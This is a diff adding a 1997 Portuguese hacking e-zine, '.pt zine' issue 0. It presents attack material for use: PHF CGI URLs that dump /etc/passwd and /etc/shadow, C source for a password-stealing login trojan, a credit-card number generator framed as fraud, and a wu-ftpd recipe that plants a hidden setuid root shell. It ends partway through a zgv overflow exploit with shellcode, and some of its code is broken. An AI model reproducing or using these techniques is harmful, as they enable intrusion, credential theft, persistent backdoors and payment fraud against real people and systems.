@@ -1,0 +1,1504 @@
+  ____________________________________________________________
+
+
+.pt zine - número 0
+7 de Julho de 1997
+
+
+********************************************************************************
+********************************************************************************
+
+
+Indice:
+
+ - Disclamer 
+ - Introdução 
+ - Qual é o objectivo desta zine? 
+ - Secções da .pt zine 
+ - Hacking... O que é?? 
+ - PHF Web Hacking 
+ - Cavalos de Tróia 
+ - Criar a função getpwent(char *nome_fich) 
+ - Algoritmo para gerar números de cartões de crédito válidos 
+ - Gzip pseudo-bug
+ - Exploits:
+         - wu-ftp.c
+         - zgv.c
+ - Noticias 
+ - Correio 
+ - Conclusão 
+ - Agradecimentos 
+
+
+********************************************************************************
+
+
+Disclamer:
+----------
+
+É bom um gajo dizer sempre estas cenas:
+A informação contida nesta zine pode ser considerada de ilegal, por isso, não 
+nos responsabilizamos com o que faças com ela! A responsabilidade é toda tua.
+Todo o material contido aqui deve ser exclusivamente usada para fins 
+educacionais...
+
+Se utilizares a informação contida nesta zine para actividades ilegais ficas 
+desde já avisado que nós não nos responsabilizamos pelo o que te possa 
+acontecer.
+
+Pronto, resumindo o que a gente está a tentar-te explicar é que se fizeres 
+asneiras não ponhas as culpas em nós... se a bofia te aparecer em casa, não 
+digas que a culpa é nossa. 
+
+
+********************************************************************************
+
+
+Introdução
+----------
+by Elektro
+
+
+Pois é,... ao fim de bastante tempo, um sonho nasceu! Criar a primeira
+zine portuguesa. Uma zine feita por portugueses para portugueses...
+Primeiro de tudo temos de dizer, que se você é daqueles leitores que
+está a ler esta zine para ver se tem algum artigo, que explique detalhadamente 
+e com uma linguagem simplória, como hackar um server..., mais vale desligar
+o computador, pois irá apanhar uma desilusão!! Podíamos fazer isso, mas a 
+intenção não será essa. Pretendemos que esta zine seja um impulso, para o gosto 
+pela auto-aprendizagem.
+Os objectivos desta zine, são basicamente os de:
+       -Introduzir o português no hacking.
+       -Divulgar noticias, na área do hacking, e na generalidade 
+        informática.
+       -Tentar resolver questões, a pedido, ou sugestão dos leitores.
+       -Abordar assuntos, como programação, e diferentes linguagens.
+       -Abordar directamente assuntos relacionados com o hacking.
+       -etc...
+Queríamos também aproveitar para dizer, que estamos muito desiludidos,
+com a fraca participação, em termos de colaboradores... a principio, muita
+gente parecia interessada, e bastante até..., mas a passagem à pratica, foi
+muito diferente do que estávamos a espera!!
+Portanto se você ao ler estes artigos, os achar "foleiros", ou pensar
+que fazia melhor... pense antes, que isto foi o trabalho de três ou quatro
+pessoas, que resolveram embarcar neste projecto, apenas pelo amor a "arte",
+sem segundas intenções, e sem praticamente nenhuma ajuda.
+Fica então aqui mais um apelo,... agradecíamos toda e qualquer tipo de
+colaboração,...escrevam artigos (não se preocupem que o pessoal os achem uns
+lamers, pois o que para uns e básico, para outros pode ser um quebra-cabecas,
+e vice-versa,... pois cada um aprende a seu ritmo e a sua maneira!!), dêem
+dicas, ponham dúvidas, respondam ás questões,...pois nós teremos o maior
+prazer de as divulgar... e assim nascer uma grande zine! (Fica então aqui o
+agradecimento as pessoas, poucas, que responderam ao nosso desafio).
+
+Em relação a periocidade, iremos tentar ser o mais pontuáveis possível,... 
+e apenas o sucesso das primeiras edições, ira ditar a periocidade...
+       Se por vezes ao lerem os artigos, tiverem uma sensação de deja-vu, não
+se admirem, pois todos acordamos que artigos, que considerássemos de grande
+qualidade em zines estrangeiras, seriam "tratados", (e não copiados),para
+aqui.
+A estrutura da .pt zine, assentará na divisão em secções:
+Cada secção terá um tema, tais como, programação, redes, novidades,
+curiosidades, correio dos leitores, etc.
+Iremos também fornecer software, exploits etc...
+Espero que achem esta iniciativa útil ,e mais uma vez apelo a colaboração.
+
+                                                                    Kaotik Team
+
+
+********************************************************************************
+
+
+Qual é o objectivo desta zine?
+------------------------------
+by secretos
+
+
+O objectivo desta zine é mostrar que em Portugal também existem bons hackers.
+Tentaremos que esta zine sirva para ensinar os mais novos e que seja um ponto 
+de discussão activo para os hackers mais velhos Portugueses.
+
+Pretendemos que esta zine seja para o "newbie" e para o "oldie", e por isso 
+iremos ter artigos sobre assuntos muito básicos e outros artigos mais "hard".
+
+Esta é a primeira zine em português (feita em Portugal) dedicada a hacking e 
+por isso pretendemos que esta zine seja um símbolo dos hackers lusos.
+
+Com esta zine pretendemos introduzir o português no hacking; divulgar noticias 
+na área do hacking e na generalidade informática; tentar resolver questões, 
+a pedido, ou sugestões dos leitores; abordar assuntos como programação e 
+diferentes linguagens; abordar  directamente assuntos relacionados com o 
+hacking.
+
+Tentaremos ser o mais interactivos possíveis e prometemos que todos vós serão 
+ouvidos e respondidos com a maior prontidão possível.
+
+
+********************************************************************************                  
+
+
+Secções da .pt zine
+----------------------
+by secretos
+
+
+Ao longo da duração da .pt zine vamos tentar manter estas secções e 
+esta estrutura:
+        - Disclamer ( o texto do costume...)
+        - Introdução (aonde escreveremos o que nos vier à cabeça!);
+        - Stuff (iremos ter vários artigos sobre hacking, programação e 
+        informática em geral);
+        - Exploits (aqui iremos publicar pelo menos dois exploits);
+        - Noticias (as noticias.. nada mais a dizer);
+        - Correio (aqui publicaremos os mails que nos forem enviados e
+        tentaremos dar respostas às perguntas ou então pediremos que nos 
+        enviam as respostas);
+        - Conclusão (o que poderão esperar no próximo número, e outras cenas 
+        quaisquer);
+        - Agradecimentos (o nome e contacto de todas as pessoas 
+        que estiveram envolvidos corrente número na zine).
+
+
+********************************************************************************
+
+
+Hacking... O que é??
+--------------------
+by secretos
+
+Existe muita gente que pensa que hackers, crackers, phreakers e piratas 
+(warez traders) é tudo a mesma coisa! Mas na verdade existe uma grande 
+diferença entre eles.
+
+Um hacker é uma pessoa que adora informática e que gosta de explorar/conhecer 
+tudo sobre computadores, redes, etc...
+
+        Um hacker não anda a trocar ou vender software ilegal, a isso se chama 
+piratas ou warez traders.
+        Um hacker não destrói o sistema que hackou, a isso se chama cracker.
+
+        Um hacker explorar, tenta descobrir tudo sobre um dado sistema. 
+O objectivo do hacker é o conhecimento.
+
+A alegria do hacker é entrar num server sem a ajuda de ninguém, sabendo que foi 
+mais inteligente que o admin do sistema... 
+
+Andam por ai algumas pessoas que auto se proclamam hackers, mas na verdade 
+não o são! Não basta ler a Phrack para se ser hacker; não basta estar montes de 
+tempo no #hackers; não basta escrever assim: !o k E' K tU Kerez???"; não basta 
+ouvir Prodigy. Para seres um hacker tens que hackar!!!
+Tens que meter a mãos à obra e andar de server em server, investigar, explorar, 
+aprender.
+
+Os hackers acham que toda a informação devia ser livre. Existem duas maneiras 
+de acabar com os hackers:
+        - destruir todos os computadores e instalações telefónicas (eheehhe... 
+        esta não me parece muito viável);
+        - disponibilizar toda a informação de graça e sem censura.
+
+
+Um verdadeiro hacker é um hacker com ética, com um código de honra, estes são 
+para mim algumas das regras que eu me sigo:
+        - Não destruo sistemas/servers. Burrices como esta podem-me levar à 
+        prisão;
+        - Não altero os ficheiros do sistema a não ser aqueles que servem para 
+        encobrir os meus rastos e que me dêm a oportunidade de voltar novamente 
+        ao sistema;
+        - Se alterar alguma página Web de algum server deixo sempre os ficheiros 
+        que lá estavam, posso é mudar os nomes deles. Nunca apago nada;
+        - Não partilho os meus projectos a quase ninguém. Só mesmo quem for 
+        muito, mas muito de confiança;
+        - Uso sempre o meu nickname, nunca uso o meu nome verdadeiro;
+        - Nunca falo sobre os meus projectos no telefone de casa;
+        - Não ando por ai a nukar ou a hackar servers só porque eu acho que a 
+        pessoa responsável é um lamer de merda;
+        - Não me gabo dos meus feitos a qualquer um;
+        - Não me considero um hacker de elite, nem julgo q sou mais que os 
+        outros, sei que existirá sempre alguém q saberá mais do que eu;
+        - Tenho paciência. Acho que paciência é uma grande virtude num hacker.
+
+
+Espero que este texto sirva para clarificar as ideias a algumas pessoas.
+
+
+******************************************************************************** 
+
+
+PHF Web Hacking
+----------------
+by secretos
+
+
+Ok, podem começar a dizer "Que lame zine!! Esta merda já o meu primo de 4 anos 
+sabe fazer!!". 
+Mas eu já estou farto de o pessoal novato me dizerem: "Ensina-me a hackar...", 
+"Como saco o ficheiro das passwords", etc...
+Apesar do bug do phf ser antigo (salvo erro foi descoberto em Novembro de 1996), 
+em algumas empresas e universidades, aonde não há dinheiro para investir na 
+segurança ou simplesmente porque o admin acha que ninguém se lembraria de hackar 
+o server deles, ainda se consegue sacar o ficheiro password ou o shadow através 
+de um simples 
+.../cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd .
+
+Aquilo que precisas para sacar o ficheiro passwd ou o shadow é simplesmente o 
+teu browser!! Mais nada :))
+
+Imagina que tens um url de um server, tipo http://www.hack.pt/, para sacar o 
+ficheiro passwd desse server tenta escrever 
+http://www.hack.pt/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+,ou seja, acrescentaste /cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd ao url.
+
+Agora deve-te aparecer alguma destas mensagens no teu browser:
+
+
+Error 404
+
+/cgi-bin/phf is not found on this server
+
+ou então:
+
+WARNING
+
+You do not have permission to view /cgi-bin/phf/ on this server
+
+
+mas se te aparecer algo parecido com isto:
+
+
+/cgi/phf?Qalias=x%0a/bin/cat%20/etc/passwd
+
+root:2fkbNba29uWys:0:1:Operator:/:/bin/csh
+www:Ggv.Ne57xdRas:502:100:World-Wide Web Account:/usr/local/WWW:/bin/bash
+.........
+
+
+acertas-te no JACKPOT :-)))
+Agora basta gravar o que te aparece no ecran e tentar desincriptar as passwords 
+usando o john ou outro bom desincriptador e uma boa wordlist.
+
+
+Caso ao escreveres 
+http://"nome do server"/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd 
+e te aparecer qualquer coisa parecida com isto:
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:
+daemon:x:2:2:daemon:/sbin:
+adm:x:3:4:adm:/var/adm:
+lp:x:4:7:lp:/var/spool/lpd:
+sync:x:5:0:sync:/sbin:/bin/sync
+
+isto significa que o ficheiro está shadowed, então escreve
+http://"nome do server"/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/shadow
+
+
+Através do phf também podes executar comandos tais como:
+        http://"nome do server"/cgi-bin/phf?Qalias=x%0a/bin/ls%20/bin
+        http://"server name"/cgi-bin/phf?Qalias=x%0a/bin/ls%20-la%20/bin
+
+
+Volto a dizer que este bug já é antigo e são poucos os servers que ainda 
+tem o PHF script a correr .
+
+
+Ok, espero que tenham compreendido isto tudo, mas se não perceberam népias 
+daquilo que eu estive a falar o melhor é dedicarem-se ao crochet!! 
+
+
+******************************************************************************** 
+
+
+Cavalos de Tróia
+-----------------
+by Elektro
+
+
+      Aqui há uns tempos recebemos um mail, que nos perguntava, o que é um 
+cavalo de Tróia, como funciona, se resulta...
+      Aqui vai:
+      Um cavalo de Tróia, é um pequeno e simples programa, que funciona tem 
+como principal objectivo, simular o ecrã de login de um sistema. Ou seja, é um
+programa, que esta a correr numa conta normal, mas que possui o interface da 
+sessão de login, que vemos, quando nos ligamos ao sistema...o objectivo é 
+enganar o utilizador que vai utilizar a maquina a seguir a nós,(nós pomos o 
+cavalo de Tróia a correr e o desgraçado, que vira a seguir, muito inocentemente,
+tentara entrar para a sua área, escrevendo o seu login e a sua password,nos
+campos do nosso cavalo de Tróia,...que registará tudo num ficheiro, na área 
+onde corre o programa!!:)))
+      São geralmente, programas simples, pequenos, que não requerem muitos 
+conhecimentos de programação, e os erros são faceis de detectar!!
+      No mínimo pode-se dizer que são programas "divertidos", pois estar a 
+observar a nossa obra a actuar, é demais!:)) 
+
+      Existem porem, alguns pontos a ter em consideração, ao fazer um cavalo de
+Tróia: proteger o programa dos sinais, tais como o Ctrl-c, ou Ctrl-z, que são
+os mais conhecidos,...e arranjar maneira de no final, o programa feche a área
+onde esta a correr (obvio, para quem não quer ser apanhado), e aqui é que 
+complica mais um bocado, mas existe uma maneira, que na minha opinião e a mais
+segura: será a de fazer um kill ao processo pai, do nosso programa!!!Na practica
+isto e, fazer um kill a shell, logo uma VERDADEIRA sessão de login iniciara!
+No entanto, no meio de isto tudo, o cavalo de Tróia, "apanhou" o login e a 
+password a um pobre infeliz (teoricamente)!
+
+      Para exemplificar, fiz um "esboço" de um cavala de Tróia, com os pontos
+mais básicos, e mais essenciais: (continua..)
+
+-----------------------------CORTE POR AQUI------------------------------------
+      
+
+#include <stdio.h>
+#include <signal.h>
+#include <pwd.h>
+#include <string.h>
+
+#define ERRO "Login incorrect"
+
+char *getpass();
+char login[14],
+     *password;
+int PPID;     
+FILE *fich_output;
+
+
+
+void main(int argc, char *argv[]){
+
+
+signal(SIGINT, SIG_IGN);     /* protege o programa dos sinais
+signal(SIGTSTP, SIG_IGN);          Ctrl-c e Ctrl-z            */
+
+
+     if( argc<2 ){
+                  printf("\nUso: %s <nome_da_maquina>\n", argv[0]);
+                  exit(0);
+                 }
+                
+
+     system("clear");
+
+
+     /* cria um ciclo enquanto o login for nulo  */
+     while(strlen(login)==0){
+             printf("\n%s login: ",argv[1]);
+             gets(login);
+            }
+
+
+     printf("Password: ");
+     password=getpass();      /* desliga o echo para o stdout */
+
+     if((fich_output=fopen(".pw_log","a"))==NULL) {
+                              puts("\nErro de ficheiro\n");
+                              exit(0);
+                              }
+
+     fprintf(fich_output,"Login: %s ,password: %s\n", login,
+                                                      password);
+        
+     puts(ERRO);
+
+     PPID=getppid();          /* retorna o PID da shell */
+
+     kill(PPID,9);
+
+     }
+
+
+----------------------------CORTE POR AQUI-------------------------------------
+
+(continuação...)
+como é obvio este cavalo de Tróia e para sistemas linux!
+   É obvio também que isto é um cavalo de troia "pobrezinho", será sempre bom
+melhorar o aspecto gráfico do output do programa (que e fácil, e os próprios
+iniciantes em programacao conseguem faze-lo!).
+
+   Outra coisa importante, é reparar como protegi o programa dos sinais Ctrl-c,
+e Ctrl-z...porque senão corríamos o risco de vermos a nossa área exposta, se a
+vitima e mais esperta que nós!! Uma ideia sera tentar proteger o programa para
+o maior numero possível de sinais!!
+   Para no final encerrar a nossa área, para fazer um kill a shell, ou ao 
+processo pai, usei a função getppid, para obter o Parent Process Id, e no final
+enviei o sinal 9, que e o kill,... e quando o programa termina, em vez de 
+retornar a shell, como esta "morreu", corre uma verdadeira sessão de login.
+   Para aumentar a segurança, o ficheiro para onde são registados os resultados
+do cavalo de Tróia e um ficheiro oculto (.pw_log)...outras precauções, poderão
+ser tomadas, se por exemplo ao compilar o programa lhe der o atributo de ocul-
+to...(para quem não sabe, isto consegue-se se o primeiro caracter do nome do
+ficheiro for '.'!
+   O ciclo criado enquanto o login for nulo, prevê que a vitima faça qualquer 
+coisa como fazer return em "branco"...
+   Para acabar,...resta dizer que para "receber" a password, usei a função
+getpass, declarada no header pwd.h,...esta função redirecciona o output.
+Podia-se ter usado a funcao stty do sistema...façam, quem estiver em Linux,
+man stty.
+   Mais uma vez friso, que estes programas devem-se aproximar o máximo da 
+realidade de cada maquina...ao correr este programa o 2 argumento deve ser 
+o nome da maquina host, na rede.
+
+
+********************************************************************************
+
+
+Criar a função getpwent(char *nome_fich)
+-----------------------------------------
+by Elektro
+
+
+      Os conhecidos crackers, são programas complicados de criar!!Requerem o
+uso de algoritmos muito complexos, e os erros por vezes são impossíveis de
+detectar!!
+      Ao contrario do que muita gente pensa, um cracker por exemplo quando
+esta a "tratar" de uma password, não inverte o algoritmo de encriptação, pois
+isso levaria na pratica, com o maior poder de computação existente 
+actualmente, meses! Pois o DES apanha os 7 primeiros bits de um very short 
+(conhecidos por char) e cria uma chave de 56 bits. As probabilidades eram de 
+2^56...o que inviabiliza a teoria errada de alguns, que pensam que um cracker 
+inverte o algoritmo de encriptação!
+      O que um cracker realmente faz e, dada uma string (possível password),
+o programa usa o algoritmo de encriptação, sobre essa string, e compara o 
+resultado final...dai o facto de a parte mais importante de um cracker seja a
+wordlist!
+      Mas nao é isso que este artigo pretende...este artigo pretende abordar
+um assunto diferente: como carregar as entradas de um ficheiro passwd, usando
+uma função que aceite como argumento qualquer ficheiro, que não o /etc/passwd
+em linux, ou em dos, para memoria?
+      Quem ja fez um cracker, sabe do que estou a falar!!!!!
+      Para os utilizadores do Linux, que conheçam a função getpwent, sabem 
+que esta retorna um apontador para uma estrutura....
+     Um ficheiro passwd tem o seguinte aspecto:
+
+     username:password:UID:GID:gecos:home_dir:shell
+
+     Ora quando um cracker corre, a primeira coisa que faz e carregar estas
+entradas para memoria! Como o faz:
+     Usando a linguagem C:
+     Será necessário primeiro dizer que as entradas ficam dispostas em 
+memoria, na seguinte struct:
+                        struct passwd{
+                             char *pw_name;
+                             char *pw_passwd;
+                             int UID;
+                             int GID;
+                             char *pw_gecos;
+                             char *pw_dir;
+                             char *pw_shell;
+                             };
+     E então, a função getpwent(), que poe as entradas das linhas do ficheiro
+nesta estrutura! Porem a função getpwent(), declarada em pwd.h, nao aceita
+argumentos, limitando o uso desta função ao computador host,e em DOS esta
+função não existe. Logo foi necessário criar uma função getpwent, que 
+aceita-se como argumento, uma string com o nome do ficheiro "alvo".
+     A função continuará a retornar um apontador para a struct.
+     Ora isto pode não ser fácil, mas não e nada de outro mundo, basta 
+reconstruir a função:
+(para usufruir da porção de código que se segue faça um 'cut and paste', para
+o ficheiro onde esta a desenvolver o cracker.)
+
+----------------------------------CORTE AQUI---------------------------------
+#include <stdio.h>
+#include <string.h>
+
+struct passwd *getpwent2(char *nome)
+{
+static FILE *fich = NULL;
+static struct passwd p;
+char linha[200];
+int i;
+
+  if(fich == NULL)
+         if((fich = fopen(nome,"r")) == NULL){
+                    printf("O ficheiro nao exite!");
+                    return(NULL);
+                }
+
+  for(;;){
+       if(fgets(linha,200,fich)==NULL){
+                fclose(fich);
+                fich = NULL;
+                return(NULL);
+                }
+
+                i = strlen(s)-1;
+                s[i] = '\0';
+                if(i == 0)
+                        continue;
+
+                p.pw_name[0]    = '\0';
+                p.pw_passwd[0]  = '\0';
+                p.pw_gecos[0]   = '\0';
+                p.pw_dir[0]     = '\0';
+                p.pw_shell[0]   = '\0';
+
+                strncat(p.pw_name,strtok(s,":"),9);
+                strncat(p.pw_passwd,strtok(NULL,":"),13);
+                sscanf(strtok(NULL,":"),"%d",&p.pw_uid);
+                sscanf(strtok(NULL,":"),"%d",&p.pw_gid);
+                strncat(p.pw_gecos,strtok(NULL,":"),39);
+                strncat(p.pw_dir,strtok(NULL,":"),39);
+                strncat(p.pw_shell,strtok(NULL,":"),20);
+                return &p;
+        }
+}
+-------------------------------CORTE AQUI------------------------------------
+
+  Então como pudemos ver a função getpwent2, aceita como argumento, o vector
+onde se encontra o nome do ficheiro a abrir, e continua a retornar um 
+apontador para a estrutura... está então ultrapassado o problema do carregamento 
+das entradas do ficheiro passwd para a memoria.
+  Poder-se-ia também criar uma função que copiasse as entradas directamente,
+para memoria pre-reservada, mas não seria tão eficiente.
+  Para ficar a saber mais sobre esta função, e sobre a struct passwd: faça
+em Linux, man getpwent.
+
+
+********************************************************************************
+
+
+Algoritmo para gerar números de cartões de crédito válidos
+-----------------------------------------------------------------------
+by Elektro
+
+Com certeza, toda a gente já ouviu falar nos geradores de números de cartões de 
+crédito!!!Porem muita asneira é dita, acerca deste assunto. 
+
+     1) Quando se efectua uma transacção na web, o site "vitima", não verifica, 
+imediatamente, se o cartão tem crédito associado.(alem de que este tipo de 
+informação e confidencial e apenas, instituições bancárias, teem acesso a este 
+tipo de informação).
+     2)Um cartão pode ser válido, ou seja, o número ter sido gerado pelo 
+algoritmo correcto, e num entanto, não estar atribuído, ou seja nenhuma entidade 
+bancária, ou financeira o tenha atribuído a um utilizador.
+     3)O facto de um cartão não estar atribuído, ao contrário do que se diz, 
+não inviabiliza uma compra...devido ao ponto 1).
+     4)Se um gerador, por ventura, gerar um numero atribuído...
+É PURA COINCIDÊNCIA!!! 
+
+O sucesso, deste tipo, de falcatrua, é relativo...eu, pessoalmente, nunca 
+tentaria comprar um Rolex, deste modo...porem,...quem resiste a dar uma 
+espreitadela, no bem guardado e bem pago site da Playboy! 
+Claro, que recomendo, ao que pensam em se aventurarem nestes domínios, a 
+darem uma saltada em www.anonymizer.com . 
+
+Ao que interessa: 
+
+Um número válido de um Cartão de Crédito (CC), tem 16 algarismos, dos quais 
+os quatro primeiros (chamado prefixo), indicam o código do banco emissor, e 
+o primeiro destes quatro algarismos, indica a rede, onde este
+cartão é aceite: 
+(um mesmo banco , pode ter mais do que um prefixo, por exemplo, o Totta Matic, 
+é um serviço especial do
+Banco Totta e Açores, tem um prefixo (4775), diferente dos cartões usuais!).
+
+     3 -> American Express
+     4 -> Visa (a mais usada em Portugal)
+     5 -> MasterCard
+     6 -> Discover (esta rede não e usada em Portugal)
+
+
+Como se verifica então que um número é válido?: 
+
+Por exemplo o cartão... 4938 0723 5791 0411 (rede: Visa ,Banco Pinto & Sotto 
+Mayor). 
+
+Se pegarmos nos algarismos que ocupam as posições impares no número do CC: 
+4 3 0 2 5 9 0 1 e apenas nestes, que ocupam posições impares. 
+
+Agora a esses algarismos multiplica-se 2, se o resultado for maior que 9, 
+dever-se-a subtrair nove a multiplicação...ficara então algo como: 
+
+8 6 0 4 1 9 0 2 ..isto então passará, juntando outra vez os algarismos que 
+ocupam as posições pares, para: 
+
+     8968 0743 1791 0421 
+
+agora se a soma de todos os algarismos deste novo número for um múltiplo de 10 
+e menor do que 150, o número inicial é válido... 
+
+ex: 8+9+6+8+0+7+4+3+1+7+9+1+0+4+2+1=70, que por sua vez e um múltiplo de 10 e 
+é menor do que 150!! 
+
+Junto incluo o código de um pequeno programa, que testa a validade de um dado 
+número de um CC (para melhor compreenderam o algoritmo): 
+
+(continua) 
+
+-----------------------------------CORTE AQUI---------------------------------- 
+
+#include 
+#include 
+#define TRUE 0
+#define FALSE 1
+
+typedef int boolean;
+boolean verifica(char *numero);
+char numero[18];
+
+
+void main(){
+
+
+    printf("Insira o numero: ");
+    gets(numero);
+
+     if(strlen(numero)!=16){ 
+                          puts("Numero incorrecto de digitos");
+                          exit(0);
+                          }
+
+    if(verifica(numero)==TRUE)
+                               puts("Valido");
+                                             else
+                                                puts("Falso");
+
+
+}
+
+
+boolean verifica(char *numero){
+int c,
+    soma=0,
+    size;
+char matriz[16][3];
+
+  size=(strlen(numero)-1);
+
+  /* converte um vector de caracteres, num vector de inteiros */
+  for(c=0; c<=size; c++){
+                         matriz[c][0]=numero[c];
+                         numero[c]=atoi(&matriz[c][0]);
+                        }
+
+  for(c=0; c<=size; c=c+2){
+                          numero[c]=(numero[c]*2);
+                          if(numero[c]>9)
+                                    numero[c]=(numero[c]-9);
+                          }
+
+     for(c=0; c<=15; c++)
+                  soma= soma+numero[c];
+     
+     if( (soma<150) && (soma%10)==0 )
+                                   return(TRUE);
+
+     return(FALSE);
+} 
+
+
+/*
+  ao introduzir o numero devera ignorar os espacos:a funcao destes e apenas a
+de facilitar a leitura do numero, apenas.
+
+*/
+
+------------------------------CORTE POR AQUI----------------------------------- 
+
+(continuação) 
+
+Mas, o que nos interessa, e saber como gerar números validos de CC's...para 
+isso e preciso saber muitos bem o algoritmo que testa a sua validade. 
+
+Para gerar um número, basta apenas escolher o prefixo do banco
+(independentemente, se e Visa, ou qualquer outra rede): 
+
+4938 .... .... .... 
+
+Sabemos então o prefixo, e queremos criar o resto...pois bem, é fácil: 
+
+Geram-se aleatoriamente, mais 11 algarismos (E NÃO 12!!), e ficamos, por 
+exemplo com o seguinte: 
+
+4938 1432 6745 362. 
+
+Ou seja, o último algarismo permanece, por agora desconhecido... 
+
+Tal como na função para testar, o processo e semelhante: nos algarismos que 
+ocupam posições impares, multiplicam-se por 2, e os que com esta multiplicação 
+ficarem maiores do que 9, subtrai-se 9 ao resultado, o resultado e este: 
+
+8 6 2 6 3 8 6 4. que juntando com os restantes algarismos: 
+
+8968 2462 3785 664. 
+
+A soma total dos algarismos é: 
+
+8+9+6+8+2+4+6+2+3+7+8+5+6+6+4=84 
+
+Ora, para este numero ser valido, basta que o ultimo algarismo, que ainda não 
+está atribuído seja 6, pois: 
+
+8+9+6+8+2+4+6+2+3+7+8+5+6+6+4=84+6=90 !!!! 
+
+90 e menor do que 150 e é múltiplo de 10. Ora cá temos um número gerado, 
+válido!!!!!!!!!!!!!!!!! 
+
+Para extrapolar números, a partir de porções de outros números, o processo e 
+exactamente o mesmo. 
+Por exemplo, queremos extrapolar números a partir da seguinte porção de 
+um outro número: 
+
+4938 452. .... .... 
+
+Geram-se aleatoriamente os restantes números, excepto o ultimo, e pratica-se a 
+já conhecida regra!!!!!!!! 
+
+Como podem ver, fazer um gerador de números de CC's e simples, apenas requer 
+prática de algoritmia. 
+
+Já agora ficam aqui também alguns prefixos de bancos portugueses, não inclui 
+bancos estrangeiros, pois qualquer gerador, possui uma lista destes!!! 
+
+     4775 - Banco Totta & Acores (TottaMatic)
+     4943 - Banco Mello
+     4552 - Banco Comercio e Industria
+     5901 - Banco Atlantico
+     4154 - Nova Rede
+     4547 - Banco Fonsecas e Burnay
+     5906 - Banco Borges Irmao
+     5016 - Banco Nacional Ultramarino
+     4407 - Banco Espirito Santo
+     4938 - Banco Pinto & Sotto Mayor
+     4552 - Banco Internacional de Credito
+     4644 - Caixa Geral de Depositos
+
+
+********************************************************************************
+
+
+Gzip pseudo-bug
+----------------
+
+  Aqui há uns tempos, já nem me lembro onde, desencantei um texto, que a
+principio nem dei muita importância, mas que afinal revelou-se ser muito 
+interessante!! Decidimos não o traduzir, para que nada se perdesse com uma 
+fraca tradução! Ei-lo:
+  "I found a bug in gzip that can allow a file that is being compressed or
+uncompressed to be read by anyone with search access to the directory it is
+in. Before unlink()ing the original file (when compressing or
+uncompressing), it is chmod()ed to 0777.  It looks like someone didn't
+understand the behavior of unlink(2) vs rm(1).
+
+  The problem code is in gzip.c, in copy_stat(), on line 1636:
+
+    (void) chmod(ifname, 0777);
+    if (unlink(ifname)) {
+
+  There is also a similar bug when overwriting an existing file, in
+check_ofname(), on line 1576:
+    (void) chmod(ofname, 0777);
+
+    if (unlink(ofname)) {
+
+  In both cases, the chmod() is not necessary, and only introduces a security
+hole. The solution is trivial - remove the chmod()s.
+
+gzip will not normally touch a file with a link count greater than 1. With
+-f it will. If you know that a file you want to read will be gzip -f'd,
+that makes this easy - make a hard link to it, and wait for your link to be
+the only copy, mode 777.
+
+  Without -f, there are two race conditions, an easier one if you can make a
+hard link to the file, and a hard one if you can not. There's also a
+possibility for a minor denial-of-service attack, not caused by this bug.
+
+  For the denial-of-service attack, make a hard link to a file you know will
+be gzipped either automatically or by a person who won't understand what
+the "gzip: foo has 1 other link  -- unchanged" message means. This is also
+what happens if you make the link too early for the 'easy' race. This is
+not really a gzip issue, however, but does serve as yet another example of
+why there should be some way to restrict a user from adding links to a file
+he does not own.
+
+  For the hard race, open() the file in between the chmod() and the unlink().
+This is possible, but difficult.
+
+  For the easier race, make a hard link to the file in between the lstat()
+(which is before the open(), so you have the entire time it takes to
+compress the file) and the unlink(). The problem with this race is that if
+you lose, you lose for good. You get one chance, if you do it too soon,
+gzip complains, if you do it too late, the file is gone.
+
+  This isn't really a serious bug, but it does show that software should
+always be written with race conditions in mind, and that even local
+non-suid utilities must be written with security in mind."
+
+  Esperamos que este texto tenha sido útil, para vocês, ou no mínimo, o 
+achassem interessante
+
+
+********************************************************************************
+
+
+Exploits
+---------
+
+
+---8<-------wu-ftp.c.---------8<---
+
+/****************************************************************************
+ *                                                                          *
+ *   Com certeza já conhecem o velhinho wu-ftp, mas continuo a achar que é  *
+ * eficaz, e que se bem "tratado" pode substituir os RootKits:              *
+ *                                                                          *
+ *  1º COMPILA-SE, NUMA SESSÃO DE TELNET O SEGUINTE CÓDIGO:                 *
+ *  (obviamente que é necessário possuir uma conta válida no sistema)       *
+ *                                                                          *
+ ***************************************************************************/
+ main(){
+
+ setuid(0);
+ seteuid(0);
+
+ system("cp /bin/sh /tmp/.suidroot");
+ system("chmod a+rwxs /tmp/.suidroot");
+
+ }
+
+ /***************************************************************************
+ *                                                                          *
+ *  Para quem não imagina como fazer isto, :-|, MANDA POR FTP este ficheiro *
+ *                                                                          *
+ *  Agora cria-se um shell script, chamado root.sh, com o seguinte:         *
+ *                                                                          *
+ *  exec a.out                                                              *
+ * (em que a.out e o código do wu-ftp compilado)                            *
+ *                                                                          *
+ *  Agora ligado remotamente por ftp, na conta que estamos a utilizar:      *
+ *  ftp> quote site exec sh root.sh                                         *
+ *                                                                          *
+ *  De seguida saimos do ftp, e corremos na sessão de telnet /tmp/.suidroot *
+ *                                                                          *
+ *  Veremos na prompt o símbolo '$', passar a '#'. :)))))))))))))           *
+ *                                                                          *
+ *  Sempre que quisermos ser root, basta executar /tmp/.suidroot  !!!       *
+ *                                                                          *
+ *  Como /tmp/.suidroot e um ficheiro oculto...a coisa aguenta-se.:)        *
+ *                                                                          *
+ ***************************************************************************/
+
+---8<----------------8<---
+
+
+---8<-------zgv.c---------8<---
+
+
+
+/*
+ *
+ * zgv exploit coded by BeastMaster V on June 20, 1997
+ *
+ * USAGE:
+ *   For some strage reason, the filename length of this
+ *   particular exploit must me one character long, otherwise you
+ *   will be drop into a normal unpriviledged shell. Go Figure....
+ *
+ *   $ cp zgv_exploit.c n.c
+ *   $ cc -o n n.c
+ *   $ ./n
+ *   Oak driver: Unknown chipset (id =  0)
+ *   bash#
+ *
+ * EXPLANATION: zgv (suid root) does not check bounds for $HOME env.
+ * TEMPORARY FIX:  chmod u-s /usr/bin/zgv
+ * NOTE: Don't forget to visit http://www.rootshell.com for more exploits.
+ * DISCLAIMER: Please use this in a responsible manner.
+ * 
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char *shellcode =
+  "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
